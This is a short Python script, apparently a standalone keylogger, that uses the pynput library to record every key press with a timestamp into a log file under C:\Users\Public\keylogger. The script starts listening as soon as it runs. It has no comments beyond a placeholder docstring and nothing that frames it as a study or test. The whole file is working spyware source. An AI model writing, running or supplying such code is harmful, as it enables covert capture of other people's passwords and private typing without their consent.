import os
from pynput.keyboard import Key, Listener
import logging

class Keylogger():
    def __init__(self, script_name):
        self.script_name = script_name
  
    def Run_Keylogger(self):
        '''Beschrijving'''
        keylogger_path = r"C:\Users\Public\keylogger"
        if not os.path.exists(keylogger_path):
            os.makedirs(keylogger_path)
        log_dir = ""
        logging.basicConfig(filename=(log_dir + r"C:\Users\Public\keylogger\keylogs.txt"), \
	        level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
        def on_press(key):
            logging.info(str(key))
        
        with Listener(on_press=on_press) as listener:
            listener.join()

keylogger = Keylogger("Keylogger")
keylogger.Run_Keylogger()

